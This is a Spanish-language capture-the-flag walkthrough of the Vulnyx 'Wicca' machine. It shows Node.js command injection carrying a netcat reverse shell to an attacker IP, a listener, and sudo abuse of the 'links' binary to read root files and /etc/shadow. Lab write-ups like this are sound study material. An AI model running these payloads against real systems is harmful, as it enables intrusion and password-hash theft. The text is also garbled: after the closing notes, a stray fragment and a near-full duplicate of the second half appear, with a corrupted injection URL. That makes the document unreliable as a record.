# 🚀 Explotación de Máquina Wicca (Vulnyx)

![Nivel: Medio](https://img.shields.io/badge/Nivel-Medio-orange) ![Tema: Web Exploitation + Privilege Escalation](https://img.shields.io/badge/Tema-Web%20Exploitation%20%2B%20PrivEsc-blue)

## **Descripción**
Este documento detalla la explotación completa de la máquina **Wicca** de Vulnyx, que incluye:
1. Reconocimiento de puertos y servicios
2. Análisis de aplicación web vulnerable
3. Explotación de inyección de comandos via Node.js
4. Escalada de privilegios mediante binario `links`

**Tiempo estimado**: 30-45 minutos  
**Dificultad**: Medio  
**Sistema operativo**: Linux

## **Índice**
1. [Reconocimiento](#reconocimiento)
2. [Análisis Web](#análisis-web)
3. [Explotación](#explotación)
4. [Acceso Inicial](#acceso-inicial)
5. [Escalada de Privilegios](#escalada-de-privilegios)
6. [Conclusión](#conclusión)

## **Reconocimiento**

### 1. Escaneo de Puertos
```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.0.2.14 -oN escaneo
```

**Resultados**:
- **Puerto 22/tcp**: SSH - OpenSSH
- **Puerto 80/tcp**: HTTP - Apache httpd
- **Puerto 5000/tcp**: HTTP - Node.js application

## **Análisis Web**

### 2. Investigación de Servicios Web
- **Puerto 80**: Página Apache por defecto (sin contenido relevante)
- **Puerto 5000**: Aplicación Node.js con formulario de nickname

### 3. Descubrimiento de Vulnerabilidad
- Al introducir nickname en el puerto 5000, la URL refleja el input:
  ```
  http://10.0.2.14:5000/?name=prueba&token=15612341
  ```
- No hay validación de entrada → Posible inyección

## **Explotación**

### 4. Reverse Shell con Node.js
**Payload utilizado**:
```javascript
require('child_process').exec('nc -e /bin/bash 10.0.2.4 9001')
```

**Inyección en URL**:
```
http://10.0.2.14:5000/?name=prueba&token=require('child_process').exec('nc -e /bin/bash 10.0.2.4 9001')
```

### 5. Listener en Atacante
```bash
nc -lvnp 9001
```

## **Acceso Inicial**

### 6. Obtención de Shell
- Conexión reverse shell exitosa
- Usuario: `aleister`

### 7. Flag de Usuario
```bash
cd /home/aleister
cat user.txt
```
- **User Flag**: `[Redacted]`

### 8. Tratamiento de TTY
```bash
# Mejorar shell interactiva
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset
xterm
```

## **Escalada de Privilegios**

### 9. Enumeración de Permisos Sudo
```bash
sudo -l
```

**Resultado**:
```
User aleister may run the following commands on wicca:
    (root) NOPASSWD: /usr/bin/links
```

### 10. Explotación de Binario Links
```bash
# Leer flag de root directamente
sudo links -dump file:///root/root.txt
```

**Alternativas de explotación**:
```bash
# Leer cualquier archivo del sistema
sudo links -dump file:///etc/shadow

# Intentar obtener shell (depende de versión)
sudo links -dump 'file:///bin/bash -c "/bin/bash"'
```

### 11. Flag de Root
- **Root Flag**: `[Redacted]`

## **Conclusión**

### Vulnerabilidades Críticas
1. **Inyección de comandos** en aplicación Node.js
2. **Falta de validación** de entrada en parámetro URL
3. **Permisos sudo peligrosos** en binario links

### Hardening Recomendado
- Validar y sanitizar todas las entradas de usuario
- Restringir permisos sudo innecesarios
- Implementar principio de mínimo privilegio
- Actualizar y parar aplicaciones regularmente

### Técnicas Aplicadas
1. **Escaneo de puertos** con Nmap
2. **Análisis de aplicaciones web**
3. **Inyección de comandos** en Node.js
4. **Reverse shell** con netcat
5. **Escalada de privilegios** mediante binario con sudo

---

**Herramientas utilizadas**:
- Nmap
- Netcat
- Node.js runtime
- Linux commands

**Referencias**:
- [Node.js Child Process Security](https://nodejs.org/api/child_process.html)
- [Linux Privilege Escalation via Sudo](https://gtfobins.github.io/gtfobins/links/)
- [Reverse Shell Techniques](https://revshells.com)

**Tags**: `#Vulnyx #Wicca #NodeJS #CommandInjection #Sudo #PrivEsc #CTF`

---

## **Lecciones Aprendidas**
- Las aplicaciones Node.js pueden ser vulnerables a inyección si usan `child_process` sin sanitización
- Los parámetros de URL deben validarse siempre
- Los binarios con permisos sudo deben revisarse periódicamente
- La enumeración sistemática es crucial en penetration testing

## **Notas Adicionales**
⚠️ **Solo usar en entornos controlados y con autorización**
- Esta explotación requiere modificación de IPs según el entorno
- Las versiones específicas de software pueden afectar la explotación
- Siempre documentar y reportar vulnerabilidades encontradas
  ```
- No hay validación de entrada → Posible inyección

## **Explotación**

### 4. Reverse Shell con Node.js
**Payload utilizado**:
```javascript
require('child_process').exec('nc -e /bin/bash 10.0.2.4 9001')
```

**Inyección en URL**:
```
http://10.0.2.14:5000/?name)=prueba&token=require('child_process').exec('nc -e /bin/bash 10.0.2.4 9001')
```

### 5. Listener en Atacante
```bash
nc -lvnp 9001
```

## **Acceso Inicial**

### 6. Obtención de Shell
- Conexión reverse shell exitosa
- Usuario: `aleister`

### 7. Flag de Usuario
```bash
cd /home/aleister
cat user.txt
```
- **User Flag**: `[Redacted]`

### 8. Tratamiento de TTY
```bash
# Mejorar shell interactiva
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset
xterm
```

## **Escalada de Privilegios**

### 9. Enumeración de Permisos Sudo
```bash
sudo -l
```

**Resultado**:
```
User aleister may run the following commands on wicca:
    (root) NOPASSWD: /usr/bin/links
```

### 10. Explotación de Binario Links
```bash
# Leer flag de root directamente
sudo links -dump file:///root/root.txt
```

**Alternativas de explotación**:
```bash
# Leer cualquier archivo del sistema
sudo links -dump file:///etc/shadow

# Intentar obtener shell (depende de versión)
sudo links -dump 'file:///bin/bash -c "/bin/bash"'
```

### 11. Flag de Root
- **Root Flag**: `[Redacted]`

## **Conclusión**

### Vulnerabilidades Críticas
1. **Inyección de comandos** en aplicación Node.js
2. **Falta de validación** de entrada en parámetro URL
3. **Permisos sudo peligrosos** en binario links

### Hardening Recomendado
- Validar y sanitizar todas las entradas de usuario
- Restringir permisos sudo innecesarios
- Implementar principio de mínimo privilegio
- Actualizar y parar aplicaciones regularmente

### Técnicas Aplicadas
1. **Escaneo de puertos** con Nmap
2. **Análisis de aplicaciones web**
3. **Inyección de comandos** en Node.js
4. **Reverse shell** con netcat
5. **Escalada de privilegios** mediante binario con sudo

---

**Herramientas utilizadas**:
- Nmap
- Netcat
- Node.js runtime
- Linux commands

**Referencias**:
- [Node.js Child Process Security](https://nodejs.org/api/child_process.html)
- [Linux Privilege Escalation via Sudo](https://gtfobins.github.io/gtfobins/links/)
- [Reverse Shell Techniques](https://revshells.com)

**Tags**: `#Vulnyx #Wicca #NodeJS #CommandInjection #Sudo #PrivEsc #CTF`

---

## **Lecciones Aprendidas**
- Las aplicaciones Node.js pueden ser vulnerables a inyección si usan `child_process` sin sanitización
- Los parámetros de URL deben validarse siempre
- Los binarios con permisos sudo deben revisarse periódicamente
- La enumeración sistemática es crucial en penetration testing

## **Notas Adicionales**
- Esta explotación requiere modificación de IPs según el entorno
- Las versiones específicas de software pueden afectar la explotación
- Siempre documentar y reportar vulnerabilidades encontradas
